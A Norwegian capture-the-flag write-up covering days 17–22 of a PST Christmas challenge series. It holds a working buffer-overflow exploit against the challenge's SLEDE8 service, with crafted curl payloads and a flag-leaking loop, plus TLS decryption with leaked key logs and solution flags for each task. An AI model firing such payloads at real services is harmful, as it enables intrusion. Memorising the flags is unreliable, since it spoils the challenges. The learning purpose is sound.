MIIEJaE3MDWgCQYHBAICAAUBDqEJBAdwZW5nd3luogQTAk5PoxAwDqAMMAqgCAQGU0FOVEVMpAUCAwj4k6KCA+ihggPkMIID4DAVoAMKAQCiDqAMBApjS0AET1JBSEAFMBCgAwoBAKIJoAcEBWtSQVYKMBCgAwoBAaIJoAcEBWxBTQoEMCKgAwoBAaIboBkEF2xFVgRAUQRCUUpKQVAESktBBEPnnF0bMBagAwoBAKIPoA0EC25FCARXQQRMQVYKMA6gAwoBAaIHoAUEAxsbBDAfoAMKAQGiGKAWBBRuQUMEV0FWBE1KQ0FKBFBNSkMKBDAboAMKAQCiFKASBBAODg4ODg4ODg4ODg4ODg4OMCigAwoBAaIhoB8EHW5BQwRXQVYERkVWQQQODg4ODg4ODg4ODg4ODg4OMDugAwoBAKI0oDIEMGtNCAROQUMER0tUXQtURVdQQVAEVEVXV0tWQEFQBElNUFAEUkFABEFKBEJBTUgKBDAeoAMKAQCiF6AVBBNmVkUEQEFQBEZIQQRXSEVAQEFQMBGgAwoBAaIKoAgEBk5BQ0FWFjANoAMKAQCiBqAEBAIbGzAdoAMKAQGiFqAUBBJgQVAEQlFKT0FQBE1PT0EKCgowG6ADCgEAohSgEgQQCgoKBFJBSlAESE1QUAQKCjAToAMKAQCiDKAKBAhAHUcXEkdHQjAPoAMKAQGiCKAGBARM54IbMA+gAwoBAKIIoAYEBBJFFxwwD6ADCgEAogigBgQEEBYcFTAPoAMKAQCiCKAGBARGEBxCMA+gAwoBAaIIoAYEBBsbGxswF6ADCgEAohCgDgQMQBUQQEYSHRBARUVBMBugAwoBAaIUoBIEEGxSRQRXQVYETkFDBFTngRkwI6ADCgEAohygGgQYYEFQBFdPRUgEUueCVkEEQUoEUVFNQAoEMCygAwoBAKIloCMEIWZNSkBBV1BWQU9PSkVUVEFKBElNSgRCUUpPQVYETU9PQTAroAMKAQGiJKAiBCBrQwRMUkUEQ0tAUARXT0VIBEBBUARDTuecVkEESUFDGzBPoAMKAQCiSKBGBERgUQRJ54EEUEUESUARBEVSBFFRTUADQUoEV0tJBEhLU0FWR0VXQQRMQVwES0MESEFDQ0EEUE1IBEBBUARSRUpITUNBCjAVoAMKAQGiDqAMBAp3T07nnEpKQVYFMB6gAwoBAaIXoBUEE2BBUARCUUpPQVYETU9PQQQKCgowNKADCgEAoi2gKwQpc0xLS1RXCgRxUU1AQUoEV09RSEhBBFdQRVZQQQRJQUAERx1HDAoKCg0wJaADCgEAoh6gHAQaCgoKBEtDBFdIUVBQQQRJQUAEDAoKCg0QRRcwFaADCgEBog6gDAQKc21qBQRwRU9PCjAYoAMKAQCiEaAPBA1xSkBBVgRLQwRNSkoK

Spec DEFINITIONS ::= BEGIN
    LawfulInterceptionIdentifier ::= OCTET STRING (SIZE (1..25))

    PS-PDU ::= SEQUENCE {
        pSHeader    [1] PSHeader,
        payload     [2] Payload
    }
...
```

Gjenbrukte python-koden fra luke 8, med noen modifikasjoner

```python
import base64
import asn1tools
import hashlib

SPECIFICATION = '''
Spec DEFINITIONS ::= BEGIN
    LawfulInterceptionIdentifier ::= OCTET STRING (SIZE (1..25))
    PS-PDU ::= SEQUENCE {
        pSHeader    [1] PSHeader,
        payload     [2] Payload
    }
    PSHeader ::= SEQUENCE {
        li-psDomainId                   [0] OBJECT IDENTIFIER,
        lawfulInterceptionIdentifier    [1] LawfulInterceptionIdentifier,
        authorizationCountryCode        [2] PrintableString (SIZE (2)) OPTIONAL,
        communicationIdentifier         [3] CommunicationIdentifier,
        sequenceNumber                  [4] INTEGER (0..4294967295),
        timeStamp                       [5] GeneralizedTime OPTIONAL,
        ...,
        interceptionPointID             [6] PrintableString (SIZE (1..8)) OPTIONAL
    }
    Payload ::= CHOICE {
        cCPayloadSequence  [1] SEQUENCE OF CCPayload,
       ...
    }
    CommunicationIdentifier ::= SEQUENCE  {
        networkIdentifier [0] NetworkIdentifier,
        communicationIdentityNumber [1] INTEGER (0..4294967295) OPTIONAL,
        deliveryCountryCode [2] PrintableString (SIZE (2)) OPTIONAL,
        ...
    }
    NetworkIdentifier ::= SEQUENCE  {
        operatorIdentifier          [0] OCTET STRING (SIZE(1..16)),
        networkElementIdentifier    [1] OCTET STRING (SIZE(1..16)) OPTIONAL,
        ...,
        eTSI671NEID                 [2] Network-Element-Identifier OPTIONAL
    }
    Network-Element-Identifier ::=  CHOICE {
        iP-Format           [3] OCTET STRING (SIZE (1..25)),
        dNS-Format          [4] OCTET STRING (SIZE (1..25)),
        ...
    }
    CCPayload ::= SEQUENCE {
        payloadDirection    [0] PayloadDirection OPTIONAL,
        timeStamp           [1] GeneralizedTime OPTIONAL,
        cCContents          [2] CCContents,
        ...
    }
    PayloadDirection ::= ENUMERATED {
        fromTarget(0),
        toTarget(1),
        ...
    }
    CCContents ::= CHOICE {
        undefinedCC     [0]  OCTET STRING,
        ...
    }
END'''

npst = asn1tools.compile_string(SPECIFICATION, 'ber')
decoded_bytes = base64.b64decode('MIIEJaE3MDWgCQYHBAICAAUBDqEJBAdwZW5nd3luogQTAk5PoxAwDqAMMAqgCAQGU0FOVEVMpAUCAwj4k6KCA+ihggPkMIID4DAVoAMKAQCiDqAMBApjS0AET1JBSEAFMBCgAwoBAKIJoAcEBWtSQVYKMBCgAwoBAaIJoAcEBWxBTQoEMCKgAwoBAaIboBkEF2xFVgRAUQRCUUpKQVAESktBBEPnnF0bMBagAwoBAKIPoA0EC25FCARXQQRMQVYKMA6gAwoBAaIHoAUEAxsbBDAfoAMKAQGiGKAWBBRuQUMEV0FWBE1KQ0FKBFBNSkMKBDAboAMKAQCiFKASBBAODg4ODg4ODg4ODg4ODg4OMCigAwoBAaIhoB8EHW5BQwRXQVYERkVWQQQODg4ODg4ODg4ODg4ODg4OMDugAwoBAKI0oDIEMGtNCAROQUMER0tUXQtURVdQQVAEVEVXV0tWQEFQBElNUFAEUkFABEFKBEJBTUgKBDAeoAMKAQCiF6AVBBNmVkUEQEFQBEZIQQRXSEVAQEFQMBGgAwoBAaIKoAgEBk5BQ0FWFjANoAMKAQCiBqAEBAIbGzAdoAMKAQGiFqAUBBJgQVAEQlFKT0FQBE1PT0EKCgowG6ADCgEAohSgEgQQCgoKBFJBSlAESE1QUAQKCjAToAMKAQCiDKAKBAhAHUcXEkdHQjAPoAMKAQGiCKAGBARM54IbMA+gAwoBAKIIoAYEBBJFFxwwD6ADCgEAogigBgQEEBYcFTAPoAMKAQCiCKAGBARGEBxCMA+gAwoBAaIIoAYEBBsbGxswF6ADCgEAohCgDgQMQBUQQEYSHRBARUVBMBugAwoBAaIUoBIEEGxSRQRXQVYETkFDBFTngRkwI6ADCgEAohygGgQYYEFQBFdPRUgEUueCVkEEQUoEUVFNQAoEMCygAwoBAKIloCMEIWZNSkBBV1BWQU9PSkVUVEFKBElNSgRCUUpPQVYETU9PQTAroAMKAQGiJKAiBCBrQwRMUkUEQ0tAUARXT0VIBEBBUARDTuecVkEESUFDGzBPoAMKAQCiSKBGBERgUQRJ54EEUEUESUARBEVSBFFRTUADQUoEV0tJBEhLU0FWR0VXQQRMQVwES0MESEFDQ0EEUE1IBEBBUARSRUpITUNBCjAVoAMKAQGiDqAMBAp3T07nnEpKQVYFMB6gAwoBAaIXoBUEE2BBUARCUUpPQVYETU9PQQQKCgowNKADCgEAoi2gKwQpc0xLS1RXCgRxUU1AQUoEV09RSEhBBFdQRVZQQQRJQUAERx1HDAoKCg0wJaADCgEAoh6gHAQaCgoKBEtDBFdIUVBQQQRJQUAEDAoKCg0QRRcwFaADCgEBog6gDAQKc21qBQRwRU9PCjAYoAMKAQCiEaAPBA1xSkBBVgRLQwRNSkoK')
decoded = npst.decode('PS-PDU', decoded_bytes)


def xor(key, data):
    return ''.join(chr(i ^ key) for i in data)


value = decoded['payload'][1]
for v in value:
    print(v['payloadDirection'], ":", bytearray(xor(36, v['cCContents'][1]), encoding="iso-8859-1").decode("utf-8"))

 # leser man samtalen, fÃ¥r man ut fÃ¸lgende
uuid = b'c9c36ccf-6a38-4281-b48f-d14db694d4a3'

print("\nPST{" + hashlib.md5(uuid).hexdigest() + '}')
```

I utgangspunktet kom det hex-strenger ut, pÃ¥ formen `634B40044F5241484005`. En liten runde i [CyberChef][1] med XOR med nÃ¸kkel 36, ga klartekst `God kveld!`. Dekoding av alt, ga fÃ¸lgende samtale

```
fromTarget : God kveld!
fromTarget : Over.
toTarget : Hei. 
toTarget : Har du funnet noe gÃ¸y?
fromTarget : Ja, se her.
toTarget : ?? 
toTarget : Jeg ser ingen ting. 
fromTarget : ****************
toTarget : Jeg ser bare ****************
fromTarget : Oi, jeg copy/pastet passordet mitt ved en feil. 
fromTarget : Bra det ble sladdet
toTarget : jeger2
fromTarget : ??
toTarget : Det funket ikke...
fromTarget : ... vent litt ..
fromTarget : d9c36ccf
toTarget : hÃ¦?
fromTarget : 6a38
fromTarget : 4281
fromTarget : b48f
toTarget : ????
fromTarget : d14db694daae
toTarget : Hva ser jeg pÃ¥=
fromTarget : Det skal vÃ¦re en uuid. 
fromTarget : Bindestrekknappen min funker ikke
toTarget : Og hva godt skal det gjÃ¸re meg?
fromTarget : Du mÃ¥ ta md5 av uuid'en som lowercase hex og legge til det vanlige.
toTarget : SkjÃ¸nner!
toTarget : Det funker ikke ...
fromTarget : Whoops. Uuiden skulle starte med c9c(...)
fromTarget : ... og slutte med (...)4a3
toTarget : WIN! Takk.
fromTarget : Under og inn.
```

Etter Ã¥ ha lest og forstÃ¥tt den teksten, kunne man gjÃ¸re fÃ¸lgende i en terminal i din umiddelbare nÃ¦rhet:

```bash
$ md5 -s c9c36ccf-6a38-4281-b48f-d14db694d4a3
MD5 ("c9c36ccf-6a38-4281-b48f-d14db694d4a3") = 0ae06caf767ac7ebce290cfc57be6a6f
```

**LÃ¸sning: PST{0ae06caf767ac7ebce290cfc57be6a6f}**

# 18 - SLEDE8, buffer overflow
> SPST har publisert noe de pÃ¥stÃ¥r er en svÃ¦rt avansert kunstig intelligens pÃ¥ sin [GitHub-konto](https://github.com/SydpolarSikkerhetstjeneste).
> Jeg har sjekket den ut pÃ¥ pingvin.spst.no, men fÃ¥r bare opp et vakkert bilde av en pingvin. Kan du ta en titt?

Her var det mye pÃ¥ en gang og mange kaninhull Ã¥ falle ned i. Om man kikket pÃ¥ den "avanserte kunstige intelligensen", sÃ¥ man fÃ¸lgende i `ai.js`

```javascript
const tellPingviner = (flag, input) => {....}

const tellPingvinerImpl = (flag) => `
SETT r10, 0
SETT r11, 1
HOPP forbi
flagg:
.DATA ${Buffer.from(flag).join(",")},0
print:
LAST r2
PLUSS r0, r11
LIK r2, r10
BHOPP print_ferdig
SKRIV r2
HOPP print
print_ferdig:
RETUR
input_buffer:
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
forbi:
TUR les_input
TUR tell_pingviner
TUR skriv_svar
fin:
STOPP
...
```
SÃ¥ her var det bÃ¥de JavaScript og SLEDE8 i skjÃ¸nn forening. SÃ¥ man pÃ¥ [pingvin.spst.no](pingvin.spst.no), kunne man se at det var et endepunkt, `count`, som tydeligvis i sin tur kalte `tellPingviner`. Med et `flag` som bare `count` visste om. FÃ¸rste utfordring var Ã¥ finne ut hvordan man kunne kalle `count`-endepunktet. Etter litt prÃ¸ving og feiling viste det seg at det var [Base64](https://en.wikipedia.org/wiki/Base64) og URL-encoding. FÃ¸lgende eksempler illustrerer dette

```bash
$ echo -n ğŸ§ğŸ§ | base64
8J+Qp/CfkKc= # denne mÃ¥ url-encodes, f.eks. i CyberChef
$ curl -i 'https://pingvin.spst.no/.netlify/functions/count?input=8J%2BQp/CfkKf'
{"svar":[2]}
 # eventuelt bare alt i ett
$ curl -G --data-urlencode "input=`echo ğŸ§ğŸ§ | base64`" https://pingvin.spst.no/.netlify/functions/count
{"svar":[2]}
```
SLEDE8-koden viste seg Ã¥ lese inn fÃ¸de til `input_buffer`, og den stoppet ikke Ã¥ skrive til denne bufferen fÃ¸r det kom et stopp-symbol, `0x00`. Det tydet pÃ¥ at man kunne sende inn flere tegn enn det var plass til i `input_buffer` og at man da ville skrive over pÃ¥fÃ¸lgende SLEDE8-kode med sin egen kode. Et godt eksempel pÃ¥ [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow)-sÃ¥rbarhet. Det gjaldt Ã¥ finne ut hva man skulle skrive over med. Etter at `input_buffer` er ferdig skrevet til, vil man begynne Ã¥ skrive over `TUR les_input` og pÃ¥fÃ¸lgende rader. Det var et begrenset antall rader man kunne overskrive fÃ¸r man Ã¸dela hele logikken, men etter prÃ¸ving og feiling, kom jeg fram til fÃ¸lgende

```
SETT r0,6 # erstatter TUR les_input, som allerede er eksekvert nÃ¥r den overskrives. SÃ¥ denne instruksjonen kunne vÃ¦rt hva som helst, blir aldri eksekvert
SETT r0,6 # erstatter TUR tell_pingviner, og fÃ¸rste kode som blir eksekvert etter les_input. r0 settes til adressen til flagg, som er 6
LAST r2   # last fÃ¸rste byte fra adresse 6, dvs flagg
SKRIV r2  # skriv den fÃ¸rste byten fra adresse 6
HOPP 500  # hopp til et vilkÃ¥rlig sted for Ã¥ avslutte
```

Men hva er hex-representasjonen av disse instruksjonene? Det mÃ¥tte vi vite for Ã¥ gi riktig fÃ¸de til programmet. I SLEDE8 finnes en mÃ¥te Ã¥ eksportere binÃ¦rfilen pÃ¥, sÃ¥ gjorde det. Fra en tidligere oppgave visste vi at binÃ¦rfilen alltid begynner med `.SLEDE8`, som er de 7 fÃ¸rste bytene i binÃ¦rfilen.

```bash
$ xxd -p program.s8
2e534c45444538 0106010604021602481f
```

SÃ¥ tok de siste 10 byte og la til fÃ¸den i SLEDE8, etterfulgt av `0x00` for Ã¥ avslutte innlesing. Dette fungerte fint, sÃ¥ da var det bare Ã¥ Base64+URL-encode de bytene, og fylle opp bufferen med f.eks. 32 pingviner fÃ¸rst. En [UTF-8 pingvin][181] har hex-kode `f09f90a7` (denne kan ogsÃ¥ brukes i [CyberChef][182]). NÃ¥r man kalte `count` med den genererte payloaden, fikk vi fÃ¸lgende tilbake

```bash
$ curl "https://pingvin.spst.no/.netlify/functions/count?input=8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKcBBgEGBAIWAkgfAA"
{"svar":[80]}
```
`80` er ASCII-koden til `P`, sÃ¥ her var vi tydeligvis pÃ¥ rett vei! Da var det bare Ã¥ fortsette med `SETT r0,7` for Ã¥ lese neste byte osv. helt til vi fikk ASCII-koden for `}`. Til slutt satt vi igjen med en fin rekke desimaltall, som lot seg [oversette til ASCII][183]. (Etter Ã¥ ha lest andres lÃ¸sningsforslag, viste det seg at man ikke trengte ett http-kall per bokstav, men at man kunne fÃ¥ all oppgulp fra kun ett kall. Det hadde vÃ¦rt mer effektivt).

For moro skyld, lagde jeg en one-liner som skriver hele flagget (sleit mest med Ã¥ fÃ¥ konvertert desimal til ASCII der). 
```bash
for i in G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l; do curl -s "https://pingvin.spst.no/.netlify/functions/count?input=8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKfwn5Cn8J-Qp_CfkKcBBgE${i}BAIWAkgfAA" | sed -e 's/{\"svar\":\[\(.*\)\]}/\1/' | xargs -I d awk 'BEGIN{printf "%c", d}'; done
```

**LÃ¸sning: PST{EveryoneAboardTheNOPESlede8}**

# 19 - Shami's Secret Sharing
> For Ã¥ forhindre at ansvaret for julegavehvelvet hviler pÃ¥ Ã©n enkeltperson, har alvebetjent Sigurd utviklet en algoritme som kan dele opp en hemmelighet i X-antall likeverdige andeler. Algoritmen er videre laget slik at det trengs Y-antall vilkÃ¥rlige andeler for Ã¥ kunne komme tilbake til den opprinnelige hemmeligheten.
> I utprÃ¸vingsfasen har Sigurd delt opp nÃ¸kkelen til julegavehvelvet i fem andeler, og bestemt at det trengs tre andeler for Ã¥ lÃ¥se det opp. Sigurd har gitt de to fÃ¸rste andelene (1 og 2) til Jule NISSEN, mens alvebetjent Reidar har fÃ¥tt andel 3, og alvebetjent Adrian har fÃ¥tt andel 5. Sigurd har beholdt andel 4 selv.
>
> (X=5, Y=3)
>
> Dette vil si at hvelvet kan Ã¥pnes enten av Jule NISSEN sammen med Ã©n vilkÃ¥rlig alvebetjent, eller av alle tre alvebetjentene sammen.
> Som en kuriositet kan vi nevne at Sigurds favorittall er 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151 (base 10)
>
> NÃ¥ viser det seg at Jule NISSEN har mistet sine andeler. De gjenvÃ¦rende kjente andelene er   
> Reidar: (3, 570999082059702856147787459046280784390391309763131887566210928611371012340016305879778028495709778777)   
> Sigurd: (4, 922383132557981536854118203074761267092170577309674587606956115449137789164641724882718353723838873409)   
> Adrian: (5, 1361613195680829887737031633110361870469394661742852962657887598996346260195423498636393760259000241699)   
> Klarer du Ã¥ gjenskape nÃ¸kkelen til julegavehvelvet? Det sier seg selv at dette haster!   

Halve oppgaven var Ã¥ finne ut hva for type kryptering det var snakk om. Etter en del googling, kom jeg fram til at det handlet om [Shamir's Secret Sharing](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing). Tenkte det kunne vÃ¦re fint Ã¥ implementere lÃ¸sningen i Java ved hjelp av et eksternt bibliotek. Det [fÃ¸rste biblioteket jeg fant](https://github.com/codahale/shamir), viste seg Ã¥ vÃ¦re utilstrekkelig. Ingen mulighet for Ã¥ angi primtallet som fÃ¸de til algoritmen. PrÃ¸vde alle mulige varianter av favorittallet fra oppgaven, men kom ingen vei. Mer googling fÃ¸rte til [en tilfeldig implementasjon](https://stackoverflow.com/questions/19327651/java-implementation-of-shamirs-secret-sharing), som tillot primtallet (dvs. favorittallet) som fÃ¸de. FÃ¸lgende kodesnutt sammen med den "tilfeldige koden fra internett" ga lÃ¸sningen

```java
final BigInteger favorittall = new BigInteger("6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151");
final BigInteger reidar = new BigInteger("570999082059702856147787459046280784390391309763131887566210928611371012340016305879778028495709778777");
final BigInteger sigurd = new BigInteger("922383132557981536854118203074761267092170577309674587606956115449137789164641724882718353723838873409");
final BigInteger adrian = new BigInteger("1361613195680829887737031633110361870469394661742852962657887598996346260195423498636393760259000241699");
SecretShare ss3 = new SecretShare(3, reidar);
SecretShare ss4 = new SecretShare(4, sigurd);
SecretShare ss5 = new SecretShare(5, adrian);
System.out.println(Shamir.combine(new SecretShare[]{ss3, ss4, ss5}, favorittall));
```

**LÃ¸sning: PST{f0rd3lt_4nsv4r_3r_d3t_b3st3_4nsv4r3t!}**
# 20 - pcap
> Vi tror en inntrenger kan ha skaffet seg tilgang til vÃ¥rt interne nettverk. Systemvariabler ser ut til Ã¥ vÃ¦re tuklet med, men vi tror ogsÃ¥ at noe informasjon er pÃ¥ avveie?

> Etter alle de merkelige hendelsene i det siste monitorerer vi heldigvis nettet vÃ¥rt. Denne saken har hÃ¸y prioritet, fint om du ser pÃ¥ den med en gang.

Nettverksanalyse er ikke min sterke side, sÃ¥ her var jeg pÃ¥ litt gyngende grunn. Heldigvis finnes internettet, med et hav av ressurser. Jeg fant et CTF-relatert dokument om [PCAP Analysis](https://github.com/welchbj/ctf/blob/master/docs/pcap.md) som ga en del gode tips. PrÃ¸vde fÃ¸rst `binwalk -e trafikk.pcapng`, men den klarte bare Ã¥ ekstrahere korrupte filer. SÃ¥ da var det over til [Wireshark](https://www.wireshark.org/) som vel er de facto standard programvare for Ã¥ analysere pcap-filer. Ã… finne noe relevant i pcap-filer er Ã¥ lete etter nÃ¥la i hÃ¸ystakken. Et godt sted Ã¥ begynne, er Ã¥ prÃ¸ve Ã¥ ekstrahere filer som Wireshark har tilgang til fra nettverksstrÃ¸mmen. Menyvalget `File->Export Objects->HTTP...` ga en liste over en lang rekker dokumenter. Det var to dokumenter som virket relevante, begge med filnavn `PyPwg==`. Den ene var en ren tekstfil med fÃ¸lgende innhold

```
Hemmeligheten er mottat
```

Den andre fila var binÃ¦r. Tok man en hexdump av den, kunne man se fÃ¸lgende
```
Content-Disposition: form-data; name="secretFile1"; filename="file1"..Content-Type: application/octet-stream
...
Content-Disposition: form-data; name="secretFile2"; filename="file2"..Content-Type: application/octet-stream
```

Det virket som om file2 var en komprimert fil siden den hadde filsignaturen [`504b0304`](https://www.filesignatures.net/index.php?page=search&search=504B0304&mode=SIG).

```bash
$ unzip PyPwg==
Archive:  PyPwg==
warning [PyPwg==]:  9342 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: file2
$ file file2
file2: pcapng capture file - version 1.0
```

Fikk ogsÃ¥ et hint der at det var noen byte i starten som kunne vÃ¦re av interesse. Etter litt prÃ¸ving og feiling, fant jeg riktig start og slutt pÃ¥ `file1`. Det kunne virke som om file1 var base64-enkodet, sÃ¥ dekodet den i samme slengen

```bash
$ dd if='PyPwg==' of=file1 bs=1 skip=156 count=9030
$ base64 -D -i file1 > tls.txt
$ cat tls.txt
CLIENT_HANDSHAKE_TRAFFIC_SECRET c08e088c3a8de40c4e984836f470b57ddd9563580d77039a07902265be82c392 9a396f29df0c36bd2a48bc02230ba5e45593c8b8645d5cc095762c633ce1f40b
SERVER_HANDSHAKE_TRAFFIC_SECRET c08e088c3a8de40c4e984836f470b57ddd9563580d77039a07902265be82c392 677422db66a266caaef05441d06f62fd8d52a2133ecafc4b9a84fdad4e58c7fb
...
```

SÃ¥ da var det tilbake til Wireshark, med nok en pcap-fil og en fil med en masse handshakes, noe som indikerte [TLS Authentication Messages](https://tools.ietf.org/html/draft-ietf-tls-tls13-28#section-4.4). 

Etter Ã¥ ha lasta pcap-fila til Wireshark, kunne man gjÃ¸re det samme med `tls.txt`: `Wireshark-Preferences->Protocols->TLS->(Pre)-Master-Secret log filename`. Etter det var gjort, kunne man eksportere objekter igjen. Denne gangen dukket to opp: `secretdoc.pdf` og `favicon.ico`. PDF-fila inneholdt flagget i klartekst. Sjekka ogsÃ¥ PDF-filas metadata med `exiftool secretdoc.pdf` uten at det ga noe ekstra.

**LÃ¸sning: PST{5h4dy53rv3r}**
# 21 - Rule 30
> Vi har fÃ¥tt en melding fra en samarbeidende tjeneste, men det ser ut til at de har glemt Ã¥ sende nÃ¸kkelen i en egen, sikker kanal.

> En annen alvebetjent har identifisert et mÃ¸nster i meldingen, og har klart Ã¥ dekode de fire fÃ¸rste tegnene. Dessverre har denne alvebetjenten avspasert idag, etter sigende for Ã¥ spille tetris, sÃ¥ vi trenger din hjelp med resten av meldingen.

Den utdelte fila hadde fÃ¸lgende innhold
```
gen0:01010000010100110101010001111011
gen1:010110001101110101010110100010010001111101011101000100110101110100011111100111011101101100110111101001100101110101000001001101011101110100100110101001101001010100100110010101101001111111000001110101101001010100010110010110001010010111010110100101100101100010100011100111011100000100000101
gen2:010011010100010101010010110111111010000101000101101111010100010110100000111001000100100111010000101110111100010101100011110101000100010111111010101110101111010111111011110100101110000001100010010100101111010110110011110011011011110001010010111100111100110110110100111001000110001110001101
gen3:011101010110110101011110010000001011001101101100100001010110110010110001001111101111111001011001100010000110110100110100010101101110110000001010100010100001010000001000010111100011000010110111110111100001010010011100011101001000011011011110000111000111010010010111001111101011010011010101
gen4:000101010010010101000011111000011001110100100111110011010010011110011011110000100000001111001110110111001010010111010110110100100010011000011010110110110011011000011100110000110101100110010000010000110011011111100110100101111100101001000011001001101001011111110001110000101001011101010101
gen5:101101011111110101100100001100101110010111111000011101011111100011101000011001110000010001110010010001111011110001010010010111110111101100101010010010011101001100100111011001010100111011111000111001011101000000111010111100000111101111100101111110101111000000011010011001101111000101010101
gen6:100101000000010100111110010111100011110000001100100101000000110100101100101110011000111010011111111010001000011011011111110000010000100111101011111111100101110111111001001111010111001000001101001111000101100001001010000110001000100000111100000010100001100000101011101110100001101101010100
gen7:111101100000110111000011110000110100011000010111111101100001010111100111100011101101001011100000001011011100101001000000011000111001111000101000000000111100010000001111110001010001111100010101110001101100110011111011001011011101110001000110000110110010110001101000100010110010100101010111
gen8:000100110001010001100100011001010110101100110000000100110011010000111000110100100101111000110000011001000111101111100000101101001110001101101100000001000110111000010000011011011010000110110100011010100111011100001001111001000100011011101011001010011110011010101101110110011110111101010000
gen9:001111011011011010111110101111010010100111011000001111011101011001001101010111111100001101011000101111101000100000110001100101110011010100100110000011101010001100111000101001001011001010010110101010111001000110011110001111101110101000101001111011100011101010100100010011100010000101011000
```

Den fÃ¸rste raden i fila, `gen0:01010000 01010011 01010100 01111011`, var 32 bits (dvs. 4 bytes) lang. Desimaltallene ble `80, 83, 84, 123`, som er ASCII-representasjonen av `PST{`. Dette var tydeligvis input til neste rad i fila, `gen1`, men hvordan? De andre radene hadde 288 bits (36 bytes) block length. Etter en del nistirring pÃ¥ rÃ¥data kunne man ane konturene av triangler og regelmessige figurer. Sammen med referansen til Tetris, diverse hint fra `wat` og `Tivec`, sÃ¥ ga det til slutt assosiasjoner til en oppgave fra Ã¥ret fÃ¸r som handlet om [rule30](https://en.wikipedia.org/wiki/Rule_30) og [cellular automation](https://en.wikipedia.org/wiki/Cellular_automaton). Det oppgitte regelsettet for rule30 sÃ¥ ikke ut til Ã¥ passe, men et annet regelsett lot seg ganske greit finne. `010` i starten pÃ¥ `gen0` bestemte det midterste tegnet i `gen1`, nemlig `1`, osv. Oppgaven var da Ã¥ fullfÃ¸re `gen0` basert pÃ¥ de andre generasjonene. Gitt regelsettet, lot `gen0` seg komplett utregne fra `gen1`. Fullstendig lÃ¸sning i Kotlin:

```kotlin
// after finding the mapping, only gen1 is required to decode gen0
const val GEN1 = "010110001101110101010110100010010001111101011101000100110101110100011111100111011101101100110111101001100101110101000001001101011101110100100110101001101001010100100110010101101001111111000001110101101001010100010110010110001010010111010110100101100101100010100011100111011100000100000101"

val rules = mapOf(
    "000" to '0',
    "001" to '1',
    "010" to '1',
    "011" to '0',
    "100" to '1',
    "101" to '0',
    "110" to '1',
    "111" to '0'
)

fun main() {
    var gen0 = "01" //known initial value
    repeat(286) {
        val candidate = gen0.takeLast(2).plus('0')
        gen0 += if (rules[candidate] == GEN1[gen0.length - 1]) '0' else '1'
    }

    gen0.windowed(size = 8, step = 8).forEach {
        print(Character(Integer.parseInt(it, 2).toChar()))
    }
}
```

**LÃ¸sning: PST{r3v3rs1bl3_c3llul4r_4ut0m4t0ns?}**

# 22 - Side-channel attack
> Den eneste stasjonen for dekryptering av Ã¸nskelister har tatt kvelden! Vi har mottatt en kryptert Ã¸nskeliste fra en person hÃ¸yt oppe pÃ¥ julenissens liste over snille barn, og nÃ¥ klarer vi ikke dekryptere den. Med bare to dager til jul sÃ¥ er dette mildt sagt krise.
> En av alvebetjentene har forsÃ¸kt Ã¥ lese ut fastvaren fra en av reservesendestasjonene for Ã¥ fÃ¥ tak i kryptonÃ¸kkelen, uten stort hell. Dessverre ser det ut som at mikrokontrolleren har lesebeskyttelse slÃ¥tt pÃ¥.

> Som et sidespor har en annen alvebetjent forsÃ¸kt Ã¥ koble seg pÃ¥ med et oscilloskop for Ã¥ mÃ¥le strÃ¸mforbruket, mens hun sendte 50 Ã¸nskelister som bare inneholdt vrÃ¸vl. PÃ¥ tross av iherdig innsats, ser ikke alvebetjenten noen sammenheng mellom de sendte Ã¸nskelistene og mÃ¥lt strÃ¸mforbruk.

> Finner du en sammenheng mellom Ã¸nskelister og strÃ¸mforbruk? Og fÃ¥r du tak i kryptonÃ¸kkelen, og dekryptert den viktige meldingen?

```
{
   "algorithm": "AES-128-ECB",
   "library": "TINYAES128C",
   "platform": "STM32F3",
   "ciphertext": "44f23b820d2240177475c36842137ca1a84de5664f6a10f9a8b2d551704cf0d078028ab2aaccf5a179a404c2b7b2e6685291fa3db038facd111484f97d54f1f6"
}
```

To filer med [NumPy](https://numpy.org/)-data, som tydeligvis er et Python-bibliotek for numeriske analyser. _Sidespor_ fra teksten refererer til [Side-channel attack](https://en.wikipedia.org/wiki/Side-channel_attack), sÃ¥ tanken er Ã¥ bruke strÃ¸mforbruket som en side-channel attack for Ã¥ fÃ¥ fram nÃ¸kkelen. Og da kunne jeg google meg fram til [Power analysis](https://en.wikipedia.org/wiki/Power_analysis). Her var det mange kaninhull Ã¥ falle ned i. Hva var sammenhengen mellom de 50 Ã¸nskelistene og strÃ¸mforbruket? Ã˜nskelistene hadde verdier 0-255, dvs. en byte. StrÃ¸mforbruket hadde oscillerende verdier. Plottet man sending av en Ã¸nskeliste opp mot tilsvarende strÃ¸mforbruk, fikk man bilder ala denne mha. [matplotlib](https://matplotlib.org/tutorials/introductory/pyplot.html) og NumPy. 

!["side channel"](../pics/pst_side_channel.png)

